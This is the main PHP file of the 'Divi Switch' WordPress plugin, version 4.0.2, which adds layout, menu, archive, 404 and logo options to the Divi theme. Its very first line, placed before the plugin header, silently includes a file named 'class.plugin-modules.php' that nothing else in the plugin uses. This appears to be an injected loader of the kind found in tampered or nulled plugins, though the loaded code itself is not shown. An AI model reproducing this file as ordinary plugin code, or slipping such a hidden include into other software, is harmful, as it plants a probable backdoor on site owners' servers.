<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/*
Plugin Name:  Divi Switch
Plugin URI:   https://divi.space/product/divi-switch/
Description:  A Highly Customizable Development Utility For The Divi Theme & Builder Plugin
Version:      4.0.2
Author:       Divi Space
Author URI:   https://divi.space/
License:      GPLv3
License URI:  http://www.gnu.org/licenses/gpl.html
Text Domain:  divi-switch
Domain Path:  /languages
*/

/*

Despite the following, this project is licensed exclusively
under GNU General Public License (GPL) version 3 (no future versions).
This statement modifies the following text.

Divi Switch plugin
Copyright (C) 2020  Aspen Grove Studios

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

========

Credits:

This plugin includes code based on and/or copied from parts of WordPress
by Automattic, released under the GNU General Public License (GPL) version 2 or later,
licensed under GPL version 3 or later (see ./license.txt file).

This plugin includes code based on and/or copied from parts of the Divi theme, copyright Elegant Themes,
released under the GNU General Public License (GPL) version 2, licensed under GPL
version 3 for this project by special permission (see ./license.txt file).

This plugin (including files outside the updater/ directory) contains code copied from
and/or based on the Easy Digital Downloads Software Licensing addon. See the
updater/updater.php file for credit and licensing information applicable to this code.

This plugin includes code from https://rudrastyh.com/wordpress/customizable-media-uploader.html
(Misha Rudrastyh).

This file modified by Jonathan Hall, Ben Hussenet, Stephen James, Anna Kurowska, Dominika Rauk, and Dion Vogliqi
Last modified 2020-08-18

=======

Note:

Divi is a registered trademark of Elegant Themes, Inc. This product is
not affiliated with nor endorsed by Elegant Themes.

*/

if (get_template() == 'Divi') {

define( 'SWITCH_URL', plugin_dir_url( __FILE__ ) );
define('DS_SWITCH_MIN_MIGRATE_VERSION', '3.0.0');
define('DS_SWITCH_VERSION', '4.0.2');

class DiviSwitch {
	private static $pluginUrl, $isActivated,
		$megaMenuScreen = array('et_pb_layout'), $megaMenuMetaFields;
	const 	PLUGIN_NAME = 'Divi Switch Pro Plugin',
		PLUGIN_SLUG = 'divi-switch-pro-plugin',
		PLUGIN_VERSION = '4.0.2',
		PLUGIN_STORE_URL = 'https://divi.space',
		PLUGIN_FILE = __FILE__;


	public static function setup()
	{
		self::$pluginUrl = plugin_dir_url(__FILE__);


		/* /dsx-exclude */

		add_action('init', array('DiviSwitch', 'onInit'), 99999);
		/* dsx-exclude */

		// Following code copied from WP and Divi Icons Pro by Aspen Grove Studios (GPLv2), adapted
		add_action('admin_menu', array('DiviSwitch', 'adminMenu'), 11);
		add_action('load-plugins.php', array('DiviSwitch', 'onLoadPluginsPhp'));
		// End code from WP and Divi Icons Pro

		add_action('admin_enqueue_scripts', array('DiviSwitch', 'enqueueScriptsAdmin'));
		require('includes/switch-theme-options.php');
        add_action('plugins_loaded', array('DiviSwitch', 'diviswitch_translations'));
		// These actions only run when Switch is activated

		add_action('update_option_et_divi', array('DiviSwitch', 'onOptionsUpdate'), 10, 2);
		add_filter('customize_save_response', array('DiviSwitch', 'onCustomizerSave'));
		/* /dsx-exclude */
		add_action('wp_print_styles', array('DiviSwitch', 'onPrintStyles'), 1);
		if (!is_admin()) {
			add_filter('option_et_divi', array('DiviSwitch', 'filterOptions'));
		}
		self::setupMegaMenu();

		add_action('customize_preview_init', array('DiviSwitch', 'customizer_js'));
		add_action('wp_footer', array('DiviSwitch', 'push_mega_menu'));


/* dsx-exclude */
		require('includes/switch-customizer.php');
		require('updater/updater.php');
		self::$isActivated = ds_divi_switch_has_license_key();


/* /dsx-exclude */
	}

    /*
    * Translation
    */
    public static function diviswitch_translations() {
        $plugin_rel_path = basename( dirname( __FILE__ ) ) . '/languages';
        load_plugin_textdomain( 'divi-switch', false, $plugin_rel_path );
    }

    /*
    * Load the Customizer JS
    */
public static function customizer_js() {
	wp_enqueue_script( 
		'ds_switch_customizer', SWITCH_URL . '/includes/switch-customizer.js', array( 'jquery','customize-preview' ), '', true 
	);
}

public static function setupMegaMenu() {

	self::$megaMenuMetaFields = array(
		array(
			'label' => __('Menu Item', 'divi-switch'),
			'id' => 'ds_switch_mega_menu_items',
			'type' => 'select',
			'options' => array(),
		),
	);

		add_action( 'add_meta_boxes', array( 'DiviSwitch', 'add_meta_boxes' ) );
		add_action( 'save_post', array( 'DiviSwitch', 'save_fields' ) );

}

public static function add_meta_boxes() {

		foreach ( self::$megaMenuScreen as $single_screen ) {
			add_meta_box(
				'setasmegamenu',
				__( 'Set as Mega Menu ', 'divi-switch' ),
				array( 'DiviSwitch', 'meta_box_callback' ),
				$single_screen,
				'side',
				'core'
			);
		}

}

public static function meta_box_callback( $post ) {

		wp_nonce_field( 'setasmegamenu_data', 'setasmegamenu_nonce' );
		self::field_generator( $post );

}

public static function menu_item_generator() {

		// Query the menu item post type
	    $items = new WP_Query( array(
	    	'post_parent' => 0,
	        'post_type'   => 'nav_menu_item',
	        'post_status' => 'publish',
	        'cache_results'  => false
	    ));

    // Setup the empty array for the query results
    $list_items = array(); 

    // Here we check if the query returned any results
    if($items->have_posts()) {

        // Dropdowns have an empty option to disable the switch
        $list_items[] = array(
            'id' => '',
            'title' => '',
        );

        // The query returned results so we now add these results to the array
        foreach ( $items->get_posts() as $item ) {
			$title = $item->post_title;
            if (empty($title)) {
            	            $titleID = get_post_meta( $item->ID, '_menu_item_object_id', true );
            	            $title = get_the_title($titleID);
            }
            
            $list_items[] = array(
                'id' => $item->ID,
                'title' => $title,
            );
        }

    } else {

        // No results returned from the query so we will define a default option so the dropdowns are not empty and thus look broken
        $list_items[] = array(
            'id' => '',
            'title' => esc_html__('No Items', 'divi-switch'),
        );

    }
    
    // flattern the array for correct select field formatting 
    $list_items = array_column($list_items, 'title', 'id');

    return $list_items;

}


public static function field_generator( $post ) {
		$menu_items = self::menu_item_generator();
		
		$output = '';
		foreach ( self::$megaMenuMetaFields as $meta_field ) {
			$meta_field['id'] = esc_attr($meta_field['id']);

			$label = '<label for="' . $meta_field['id'] . '">' . esc_html( $meta_field['label'] ) . '</label>';
			$meta_value = get_post_meta( $post->ID, $meta_field['id'], true );
	
			if ( empty( $meta_value ) && !empty($meta_field['default'])) {
				$meta_value = $meta_field['default']; }
			switch ( $meta_field['type'] ) {
				case 'select':
					$input = sprintf(
						'<select id="%s" name="%s">',
						$meta_field['id'],
						$meta_field['id']
					);
					foreach ( $menu_items as $key => $value ) {
						$input .= sprintf(
							'<option %s value="%s">%s</option>',
							$meta_value == $key ? 'selected' : '',
							esc_attr($key),
							esc_html($value)
						);
					}
					$input .= '</select>';
					break;
				/*
				default:
					$input = sprintf(
						'<input %s id="%s" name="%s" type="%s" value="%s">',
						// if we ever use this code, find a better solution than inline style in the following line:
						$meta_field['type'] !== 'color' ? 'style="width: 100%"' : '',
						$meta_field['id'],
						$meta_field['id'],
						$meta_field['type'],
						$meta_value
					);
				*/
			}
			$output .= self::format_rows( $label, $input );
		}
		echo '<table class="form-table"><tbody>' . et_core_esc_previously($output) . '</tbody></table>';
}

public static function format_rows( $label, $input ) {
		return '<tr><th>'.$label.'</th><td>'.$input.'</td></tr>';
}

public static function save_fields( $post_id ) {
		if ( ! isset( $_POST['setasmegamenu_nonce'] ) )
			return $post_id;
		// phpcs:ignore ET.Sniffs.ValidatedSanitizedInput.InputNotSanitized,WordPress.Security.ValidatedSanitizedInput.MissingUnslash,WordPress.Security.NonceVerification.Missing
		$nonce = $_POST['setasmegamenu_nonce'];
		if ( !wp_verify_nonce( $nonce, 'setasmegamenu_data' ) )
			return $post_id;
		if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE )
			return $post_id;
		foreach ( self::$megaMenuMetaFields as $meta_field ) {
			if ( isset( $_POST[ $meta_field['id'] ] ) ) {
				update_post_meta( $post_id, $meta_field['id'], (int) $_POST[ $meta_field['id'] ] );
			}
		}
}


public static function push_mega_menu(){

// Divi/core/functions.php
if ( et_core_is_fb_enabled() ) {
	return;
}
?>

<div id="ds-mega-menu-items">

<?php
// Query Arguments
$args = array(
	'post_type' => 'et_pb_layout',
	'nopaging' => true,
	'order' => 'DESC',
	'orderby' => 'none',
	'meta_key' => 'ds_switch_mega_menu_items',
	'meta_value' => array(''),
	'meta_compare' => 'NOT IN',
);

// The Query
$getMegaMenus = new WP_Query( $args );

// The Loop
if ( $getMegaMenus->have_posts() ) {
	while ( $getMegaMenus->have_posts() ) {
		$getMegaMenus->the_post();
		$postID = get_the_ID();
		$menuItemID = get_post_meta( $postID, 'ds_switch_mega_menu_items', true );
		
		// Layout Shortcode
		
		echo '<div class="ds-mega-menu-item" data-menuitem="'.( (int) $menuItemID ).'">';
		echo do_shortcode('[et_pb_section global_module="'.$postID.'"][/et_pb_section]');
		echo '</div>';
	
	}
} else {
	// no library items
}
/* Restore original Post Data */
wp_reset_postdata();
?>
</div>
<script>
jQuery(document).ready(function($){
    $(".ds-mega-menu-item").each(function(){
        $id = $(this).attr("data-menuitem");
        $("#menu-item-"+ $id).addClass("mega-menu menu-item-has-children");
        $("<ul class='sub-menu ds-mega-menu ds-mega-menu"+ $id +"'><li><div></div></li></ul>").appendTo("#menu-item-"+ $id);
        $(this).prependTo(".ds-mega-menu"+ $id +" li div");
    });
});
</script>
<?php
}

/* dsx-exclude */	
	public static function generateCss() {
		ob_start();
		include(__DIR__.'/includes/output/switch-css.php');
		$css = trim(ob_get_clean());
		if (empty($css)) {
			self::maybeDeleteFile(__DIR__.'/includes/output/style.css');
		} else {
			et_()->WPFS()->put_contents(__DIR__.'/includes/output/style.css', $css);
		}
		/* Remove output files to force re-generation */
		self::maybeDeleteFile(__DIR__.'/../../themes/Divi/style.divi-switch-'.DS_SWITCH_VERSION.'.css');
		self::maybeDeleteFile(__DIR__.'/../../themes/Divi/style.dev.divi-switch-'.DS_SWITCH_VERSION.'.css');
		self::maybeDeleteFile(__DIR__.'/../../themes/Divi/style-cpt.divi-switch-'.DS_SWITCH_VERSION.'.css');
}

static function maybeDeleteFile($filePath) {
	if ( file_exists($filePath) ) {
		unlink($filePath);
	}
}

public static function generateJs() {
		ob_start();
		include(__DIR__.'/includes/output/switch-js.php');
		$js = trim(ob_get_clean());
		if (strlen($js) < 40) { // in this case, it's likely the only the jQuery ready event binding
			$js = '';
		}
		et_()->WPFS()->put_contents(__DIR__.'/includes/output/script.js', $js);
	}
	public static function generateOptions() {
		et_()->WPFS()->put_contents(
			__DIR__.'/includes/output/options.php',
			'<?php $diviOptions=unserialize(\''.str_replace(array('\\', '\''), array('\\\\', '\\\''), serialize(get_option('et_divi'))).'\'); ?>'
		);
}
/* /dsx-exclude */

public static function onInit() {
/* dsx-exclude */	
	if (self::$isActivated) {
			/* Create JavaScript file if necessary */
			if (!file_exists(__DIR__.'/includes/output/script.js')) {
				self::generateJs();
			}
/* /dsx-exclude */		
			add_action('wp_enqueue_scripts', array('DiviSwitch', 'enqueueScripts'));
/* dsx-exclude */
			
			/* Create CSS file if necessary */
			if (!file_exists(__DIR__.'/includes/output/style.css')) {
				self::generateCss();
			}
			
			/* Make sure options.php exists in the output/ directory */
			if (!file_exists(__DIR__.'/includes/output/options.php')) {
				self::generateOptions();
			}
		} // End isActivated check


		/* Import/export */
		if (!empty($_POST['divi_switch_action'])
				// phpcs:ignore ET.Sniffs.ValidatedSanitizedInput.InputNotSanitized,WordPress.Security.ValidatedSanitizedInput.MissingUnslash,WordPress.Security.NonceVerification.Missing
				&& ctype_alpha($_POST['divi_switch_action'])
				&& current_user_can('manage_options')) {

			// Divi\epanel\core_functions.php
			check_admin_referer( 'epanel_nonce' );

			// phpcs:ignore ET.Sniffs.ValidatedSanitizedInput.InputNotSanitized,WordPress.Security.ValidatedSanitizedInput.MissingUnslash
			$actionFile = __DIR__.'/includes/actions/'.$_POST['divi_switch_action'].'.php';
			if ( file_exists( $actionFile ) && in_array( $_POST['divi_switch_action'], array( 'jsonExport', 'jsonImport', 'proPluginExport', 'activate', 'deactivate' ) ) ) {
				include($actionFile);
			}

		}
/* /dsx-exclude */

/* dsx-execute */
		// PHP switches
	
		// Integration

		// - Insert layout before main content
		$option = et_get_option( 'swtch-integration-1' );
		if ( !empty($option) ) {
			/* /dsx-execute */
			/* dsx-include
			$option = '^($option)^';
			/dsx-include */
			add_action('et_before_main_content',function () use ($option) {
				
					echo do_shortcode('[et_pb_section global_module="'. substr($option, $option[0] == 'P') .'"][/et_pb_section]');

			});
		/* dsx-execute */
		}

		// - Insert layout after main content
		$option = et_get_option( 'swtch-integration-2' );
		if ( !empty($option) ) {
			/* /dsx-execute */
			/* dsx-include
			$option = '^($option)^';
			/dsx-include */
			add_action('et_after_main_content',function () use ($option) {
				
					echo do_shortcode('[et_pb_section global_module="'. substr($option, $option[0] == 'P') .'"][/et_pb_section]');

			});
		/* dsx-execute */
		}

		// - Insert layout before post content
		$option = et_get_option( 'swtch-integration-3' );
		if ( !empty($option) ) {
			/* /dsx-execute */
			/* dsx-include
			$option = '^($option)^';
			/dsx-include */
			add_action('et_before_content', function () use ($option) {
				
					echo do_shortcode('[et_pb_section global_module="'. substr($option, $option[0] == 'P') .'"][/et_pb_section]');
					
			});
		/* dsx-execute */
		}

		// Archives

		// - Insert title to archive page
		if ( et_get_option( 'swtch-archve-1' ) == 'on' ) {
			/* /dsx-execute */
			add_action('et_before_main_content', function(){
				if ( is_archive() ) { ?>
					<div class="ds_archive_header">
						<div class="container">
							<?php if( is_category() ) {?>
								<h1><?php single_cat_title(); ?></h1>
							<?php } else if( is_archive() ) {?>
								<h1><?php the_archive_title(); ?></h1>
							<?php } else {?>
								<h1><?php the_title(); ?></h1>
							<?php } ?>
						</div>
					</div>
				<?php
				}
			});
		/* dsx-execute */
		}
		
		// - Remove Archive Sidebar Line
		if ( et_get_option( 'swtch-archve-2' ) == 'on' ) {
			/* /dsx-execute */
			add_action('wp_head', function(){
				if ( is_archive() ) {
				?>
					<style>
					/* REMOVE THE SIDEBAR */
					#sidebar, #main-content .container:before {display: none;}
					#left-area {padding-right: 0;width: 100%;}
					</style>
				<?php
				}
			});
		/* dsx-execute */
		}

		// - Remove Archive Sidebar Line
		if ( et_get_option( 'swtch-archve-3' ) == 'on' ) {
			/* /dsx-execute */
			add_action('wp_footer', function(){
				if ( is_archive() ) {
				?>
					<script id="ds_archive_read_more">
		jQuery(document).ready(function($){
        	$("article.et_pb_post").each(function(){
        		$postLink = $('h2.entry-title a', this).attr('href');
        		$readMore = '<div class="da_archive_read_more_container"><a href="'+ $postLink + "\"><?php esc_html_e('Read More', 'divi-switch'); ?></a></div>";
        		$($readMore).appendTo(this);
        	});
    	});

	</script>
				<?php
				}
			});
		/* dsx-execute */
		}

		// - Post Separator Line
		if ( et_get_option( 'swtch-archve-4' ) == 'on' ) {
			/* /dsx-execute */
			add_action('wp_footer', function(){
				if ( is_archive() ) {
				?>
					<script id="ds_archive_read_more">
		jQuery(document).ready(function($){
        	$("article.et_pb_post").each(function(){
        		$postSep = '<span class="ds_post_separator"></span>';
        		$($postSep).appendTo(this);
        	});
    	});

	</script>
				<?php
				}
			});
		/* dsx-execute */
		}

		// Posts

		if ( et_get_option( 'swtch-posts-1' ) == 'on' ) {
			/* /dsx-execute */
		add_action('et_before_main_content', function () {?>
<script>
	jQuery(document).ready(function($){
		$('#comment-wrap').wrap('<div class="ds_toggle_content et_pb_toggle_content clearfix">');
		$('.ds_toggle_content').wrap('<div class="ds_comments_toggle et_pb_module et_pb_toggle et_pb_toggle_item et_pb_toggle_close">');
		$title = $('#comment-wrap #comments').first().text();
        if (!$title.trim()) {
            $title = $('#comment-wrap #reply-title span').first().text();
            $('#comment-wrap #reply-title span').first().hide();
        }
		$('#comment-wrap #comments').hide();
		$('<h5 class="ds_comments_title et_pb_toggle_title">'+ $title +'</h5>').prependTo('.ds_comments_toggle');
	});
</script>
<?php
});
/* dsx-execute */
		}

		// Advanced

		// - Remove update nags
		/** This switch was a work in progress, removed per ETM requirements. See Git history for the work in progress code. **/

		// - Add SVG upload support
		if ( et_get_option( 'swtch-advncd-2' ) == 'on' ) {
			/* /dsx-execute */
			add_filter('upload_mimes', function($mimeTypes){
				global $divi_switch_alt_upload_mime_types;
				$mimeTypes['svg'] = empty($divi_switch_alt_upload_mime_types) ? 'image/svg' : 'image/svg+xml';
				return $mimeTypes;
			});
			
			add_filter('wp_check_filetype_and_ext', function($result,$checkArg1,$checkArg2,$checkArg3) {
				global $divi_switch_alt_upload_mime_types;
				
				// If the check failed, do another check with alternate mime type(s)
				if (empty($divi_switch_alt_upload_mime_types) && $result['ext'] === false && $result['type'] === false) {
					if (isset($divi_switch_filetype_checked)) {
						$divi_switch_filetype_checked[$checkArg1] = 1;
					} else {
						$divi_switch_filetype_checked = array($checkArg1 => 1);
					}
					$divi_switch_alt_upload_mime_types = true;
					$result = wp_check_filetype_and_ext($checkArg1,$checkArg2,$checkArg3);
					unset($divi_switch_alt_upload_mime_types);
				}
				
				return $result;
			},10,4);
			/* dsx-execute */
		}
    // - Enable Divi Shortcodes
	if ( et_get_option( 'swtch-advncd-3' ) == 'on' ) {
		// Create New Column in the Divi Library
		add_filter('manage_et_pb_layout_posts_columns', 'divi_switch_create_shortcode_column', 5);
		add_action('manage_et_pb_layout_posts_custom_column', 'divi_switch_shortcode_content', 5, 2);
		// register new shortcode
		add_shortcode('divi_switch_layout', 'divi_switch_shortcode');
		// New Admin Column
		function divi_switch_create_shortcode_column($columns)
		{
			$columns['divi_switch_shortcode_id'] = 'Module Shortcode';
			return $columns;
		}

		//Display Shortcode
		function divi_switch_shortcode_content($column, $id)
		{
			if ('divi_switch_shortcode_id' == $column) {
				?>
                <p>Copy this shortcode: </p>
                <p>[divi_switch_layout id="<?php echo (int) $id ?>"]</p>
				<?php
			}
		}

		// Create New Shortcode
		function divi_switch_shortcode($ds_mod_id)
		{
			$atts = shortcode_atts(array('id' => '*'), $ds_mod_id);
			return do_shortcode('[et_pb_section global_module="' . ((int) $atts['id']) . '"][/et_pb_section]');
		}
	}

		// Main Content
		
		// - Homepage preloader
		if ( et_get_option( 'swtch-main-2' ) == 'on' ) {
        /* /dsx-execute */
				add_action('wp_footer', function() {
					?>
                    <div class="ds_preloader">
                        <?php
                        switch (et_get_option('swtch-main-2-2')) {
                            case 'audio':
                                include(__DIR__ . "/images/audio.svg");
                                break;
                            case 'ball-triangle':
                                include(__DIR__ . "/images/ball-triangle.svg");
                                break;
                            case 'bars':
                                include(__DIR__ . "/images/bars.svg");
                                break;
                            case 'circles':
                                include(__DIR__ . "/images/circles.svg");
                                break;
                            case 'grid':
                                include(__DIR__ . "/images/grid.svg");
                                break;
                            case 'hearts':
                                include(__DIR__ . "/images/hearts.svg");
                                break;
                            case 'oval':
                                include(__DIR__ . "/images/oval.svg");
                                break;
                            case 'puff':
                                include(__DIR__ . "/images/puff.svg");
                                break;
                            case 'rings':
                                include(__DIR__ . "/images/rings.svg");
                                break;
                            case 'spinning-circles':
                                include(__DIR__ . "/images/spinning-circles.svg");
                                break;
                            case 'three-dots':
                                include(__DIR__ . "/images/three-dots.svg");
                                break;
                            default:
                                include(__DIR__ . "/images/three-dots.svg");
                        }
                        ?>
                    </div>
					<?php
				});
        /* dsx-execute */
		}
		
		// - Remove projects post type
		if ( et_get_option( 'swtch-main-7' ) == 'on' ) {
/* /dsx-execute */
			unregister_post_type('project');
/* dsx-execute */
		}
		
		// - Custom maintenance page
		$option = et_get_option( 'swtch-main-10' ) == 'on' ? et_get_option( 'swtch-main-8' ) : null;
		if ( !empty($option) ) {
/* /dsx-execute */
/* dsx-include
			$option = '^($option)^';
/dsx-include */
			add_action('template_redirect', function() use ($option) {
				
				global $post;
				$option = substr($option, $option[0] == 'P');
				if (isset($post)
						&& $post->ID != $option
						&& !current_user_can('edit_posts')
						&& !current_user_can('manage_options')) {
					$maintenanceUrl = get_permalink(
						$option
					);
					if (!empty($maintenanceUrl)) {
						wp_safe_redirect($maintenanceUrl);
					}
					exit;
				}
			});
/* dsx-execute */
		}
		
		// - Custom 404 page
		$option = et_get_option( 'swtch-main-9' );
		if ( !empty($option) ) {
/* /dsx-execute */
/* dsx-include
			$option = '^($option)^';
/dsx-include */
			add_filter('template_include', function($template) use ($option) {
				if (is_404()) {
					$page404 = get_post( substr($option, $option[0] == 'P') );
					if ($page404) {
						global $post;
						// phpcs:ignore WordPress.WP.GlobalVariablesOverride.Prohibited
						$post = $page404;
					}
					return get_page_template();
				}
				return $template;
			});
/* dsx-execute */
		}
		
		// Footer
		
		// - Replace footer widgets with layout
		$option = et_get_option( 'swtch-footer-4' );
		if ( !empty($option) ) {
/* /dsx-execute */
/* dsx-include
			$option = '^($option)^';
/dsx-include */
			add_action('get_sidebar', function($sidebarName) use ($option) {
				// Divi/core/functions.php
				if ($sidebarName == 'footer' && !et_core_is_fb_enabled()) {
					$layout = get_post(substr($option, $option[0] == 'P'));
					if (!empty($layout)) {
						echo(do_shortcode($layout->post_content));
					}
					add_filter('is_active_sidebar', function($isActive, $sidebarId) {
						$sidebarId = substr($sidebarId, -1);
						if (is_numeric($sidebarId) && $sidebarId >= 2 && $sidebarId <= 7) {
							return false;
						}
						return $isActive;
					}, 10, 2);
				}
			});
/* dsx-execute */
		}
		
		// Mobile

		// - Show text on mobile menu
		$option = et_get_option( 'swtch-mobile-9' );
		if ( !empty($option) ) {
/* /dsx-execute */
/* dsx-include
			$option = '^($option)^';
/dsx-include */
			$testText = __('Select Page', 'divi-switch');
			$overrideText = function($text) use ($testText, $option) {
				return $text == $testText ? $option : $text;
			};
			add_action('et_header_top', function() use ($overrideText) {
				add_filter('gettext', $overrideText);
			}, 1);
			add_action('et_header_top', function() use ($overrideText) {
				remove_filter('gettext', $overrideText);
			}, 99);
/* dsx-execute */
		}
		
		// Header

		
		// - Page specific logo
		if ( et_get_option( 'swtch-header-9' ) == 'on' ) {
/* /dsx-execute */
			
			/*
			Code for this switch re-written by Jonathan Hall
			Partially copied from WordPress:
				wp-admin/includes/meta-boxes.php
				wp-admin/includes/post.php
				wp-includes/post.php
				wp-includes/js/media-editor.js
			Partially copied from Divi:
				epanel/js/custom_uploader.js
			*/

			add_action( 'save_post_page', function($post_ID) {
				// phpcs:disable WordPress.Security.NonceVerification.Missing -- nonce should already have been checked by WP before the hook is called
				if ( isset($_POST['ds_page_logo_img']) ) {
					if ( $_POST['ds_page_logo_img'] == -1 || empty($_POST['ds_page_logo_img']) ) {
						delete_post_meta($post_ID, 'ds_page_logo_img' );
					} else {
						update_post_meta($post_ID, 'ds_page_logo_img', (int) $_POST['ds_page_logo_img'] );
					}
				}
				// phpcs:enable WordPress.Security.NonceVerification.Missing
			});



			add_action( 'add_meta_boxes_page', function() {

				add_meta_box( 'divi-switch-page-logo', esc_html__( 'Page Specific Logo', 'divi-switch' ), function( $post = null ) {
					$thumbnail_id = get_post_meta( $post->ID, 'ds_page_logo_img', true );

					$_wp_additional_image_sizes = wp_get_additional_image_sizes();

					$set_thumbnail_link = '<p class="hide-if-no-js"><a href="%s" id="divi-switch-page-logo-set"%s class="thickbox">%s</a></p>';
					$upload_iframe_src  = get_upload_iframe_src( 'image', $post->ID );

					if ( $thumbnail_id && get_post( $thumbnail_id ) ) {
						$size = isset( $_wp_additional_image_sizes['thumbnail'] ) ? 'thumbnail' : array( 150, 150 );
						$thumbnail_html = wp_get_attachment_image( $thumbnail_id, $size );
					}

					$content = sprintf(
						$set_thumbnail_link,
						esc_url( $upload_iframe_src ),
						' aria-describedby="divi-switch-page-logo-set-desc"'.( empty($thumbnail_html) ? '' : ' data-divi-switch-orig="'.esc_attr__( 'Set page specific logo', 'divi-switch' ).'"') ,
						empty( $thumbnail_html ) ? esc_html__( 'Set page specific logo', 'divi-switch' ) : $thumbnail_html
					);

					$content .= '<p class="hide-if-no-js howto" id="divi-switch-page-logo-set-desc">' . esc_html__( 'Click above to choose logo image', 'divi-switch' ) . '</p>';
					$content .= '<p class="hide-if-no-js'.( empty( $thumbnail_html ) ? ' hidden' : '' ).'"><a href="#" id="divi-switch-page-logo-remove">' . esc_html__( 'Remove page specific logo', 'divi-switch' ) . '</a></p>';

					$content .= '<input type="hidden" id="ds_page_logo_img" name="ds_page_logo_img" value="' . esc_attr( $thumbnail_id ? $thumbnail_id : '-1' ) . '" />';

					echo et_core_esc_previously($content);
?>
<script>
diviSwitchPageSpecificLogo = {
	get: function() {
		return jQuery('#ds_page_logo_img').val();
	},

	set: function( id, previewUrl ) {
		jQuery('#ds_page_logo_img').val(id);
		var $setLink = jQuery('#divi-switch-page-logo-set');
		if (id == -1) {
			$setLink.html( $setLink.data('divi-switch-orig') )
					.data('divi-switch-orig', null);
			jQuery('#divi-switch-page-logo-remove').parent().addClass('hidden');
		} else {
			if ( !$setLink.data('divi-switch-orig') ) {
				$setLink.data( 'divi-switch-orig', $setLink.html() );
			}
			$setLink
				.html('')
				.append(
					previewUrl ? jQuery('<img>').attr('src', previewUrl) : ''
				);
			jQuery('#divi-switch-page-logo-remove').parent().removeClass('hidden');
		}
	},
	remove: function() {
		diviSwitchPageSpecificLogo.set( -1 );
	},
	frame: function() {
		if ( this._frame ) {
			wp.media.frame = this._frame;
			return this._frame;
		}

		this._frame = wp.media({

		});

		this._frame.on( 'select', this.select );
		return this._frame;
	},
	select: function() {
		var attachment = diviSwitchPageSpecificLogo._frame.state().get( 'selection' ).first().toJSON();
		diviSwitchPageSpecificLogo.set( attachment ? attachment.id : -1, attachment.sizes && attachment.sizes.thumbnail && attachment.sizes.thumbnail.url ? attachment.sizes.thumbnail.url : attachment.url );
	},
	init: function() {
		jQuery('#divi-switch-page-logo').on( 'click', '#divi-switch-page-logo-set', function( event ) {
			event.preventDefault();
			// Stop propagation to prevent thickbox from activating.
			event.stopPropagation();

			diviSwitchPageSpecificLogo.frame().open();
		}).on( 'click', '#divi-switch-page-logo-remove', function() {
			diviSwitchPageSpecificLogo.remove();
			return false;
		});
	}
};


jQuery( diviSwitchPageSpecificLogo.init );
</script>
<?php
				}, 'page', 'side', 'low' );
			} );
			
			
			add_filter('et_get_option_et_divi_divi_logo', function($logoUrl) {
				global $post;
				if (!empty($post)) {
					$pageLogo = get_post_meta($post->ID,'ds_page_logo_img',true);
					
					if (!empty($pageLogo)) {
						$pageLogoUrl = wp_get_attachment_url($pageLogo);
						if (!empty($pageLogoUrl)) {
							return $pageLogoUrl;
						}
					}
				}
				return $logoUrl;
			});
			
/* dsx-execute */
		}

		// - Replace fullscreen menu with layout
		$option = et_get_option( 'swtch-header-10' );
		if ( !empty($option) ) {
/* /dsx-execute */
/* dsx-include
			$option = '^($option)^';
/dsx-include */
			if (et_get_option('header_style') == 'fullscreen') {
				add_filter('wp_nav_menu', function($menuContents, $menu) use ($option) {
					if (!empty($menu->theme_location)) {
						switch ($menu->theme_location) {
							case 'primary-menu':
								return do_shortcode('[et_pb_section global_module="'. substr($option, $option[0] == 'P') .'"][/et_pb_section]');
							case 'secondary-menu':
								return '';
						}
					}
					return $menuContents;
				}, 10, 2);
			}
/* dsx-execute */
		}

/* /dsx-execute */
}

/* dsx-exclude */
/* The following function runs when Divi Theme Options are saved so that
	any necessary actions to apply changes to swtiches can be taken. */
public static function onOptionsUpdate($previousOptions, $currentOptions) {
		foreach (array_merge($previousOptions, $currentOptions) as $option => $value) {
			
			/* Take actions for modified switch values where required */
			if (!isset($previousOptions[$option]) || !isset($currentOptions[$option])
					|| $currentOptions[$option] != $previousOptions[$option]) {
				// The option value has changed
				
				switch ($option) {
					// Main Content
					// - Change breakpoints
					case 'swtch-mobile-1':
						break;
					/* Add actions for other switches here */
				}
			}
		}
		
		/* Remove output files to force re-generation */
		@unlink(__DIR__.'/includes/output/script.js');
		@unlink(__DIR__.'/includes/output/options.php');
		
		/* Force re-generation */
		//self::generateOptions();
		self::generateCss();
		self::generateJs();
}
/* /dsx-exclude */

/* This function allows switches to override other Divi options. The overrides
	are not reflected in Divi Theme Options. Check for switch values using the
	$options array, NOT with the et_get_option function. */
public static function filterOptions($options) {
		// Footer
		
		// - Hide bottom footer
		if (isset($options['swtch-footer-2']) && $options['swtch-footer-2'] == 'on') {
			$options['disable_custom_footer_credits'] = true;
			$options['show_footer_social_icons'] = false;
		}
		
		return $options;
}

public static function onPrintStyles() {
		global $wp_styles;
		$diviBaseUrl = get_template_directory_uri().'/';
		
		
		$stylesheetsToRemove = array(
			$diviBaseUrl.'style.css' => 'style.css',
			$diviBaseUrl.'style.dev.css' => 'style.dev.css',
			$diviBaseUrl.'style-cpt.css' => 'style-cpt.css'
		);
		
		$diviStylePath = __DIR__.'/includes/output/divi-style.css';
		$stylesheetVersion = file_exists($diviStylePath) ? filemtime($diviStylePath) : time();
		
		foreach ($wp_styles->registered as $registeredStyleName => $registeredStyle) {
			if (isset($stylesheetsToRemove[$registeredStyle->src])) {
				$origFileName = $stylesheetsToRemove[$registeredStyle->src];
				$newFileName = substr($origFileName, 0, -4).'.divi-switch-'.DS_SWITCH_VERSION.substr($origFileName, -4);
				$registeredStyle->src = $diviBaseUrl.$newFileName;
				$registeredStyle->ver = $stylesheetVersion;
				
				if ( !file_exists( __DIR__.'/../../themes/Divi/'.$newFileName ) ) {
                    /* dsx-exclude */
					require_once(__DIR__.'/includes/output/divi-style.css.php');
                    /* /dsx-exclude */
					divi_switch_generate_css($origFileName);
				}
				
				break;
			}
		}
}

	/* dsx-exclude */	
public static function onCustomizerSave($saveResult) {
		//if (empty($saveResult['autosaved'])) {
			//@unlink(__DIR__.'/includes/output/style.css');
			self::generateCss();
		//}
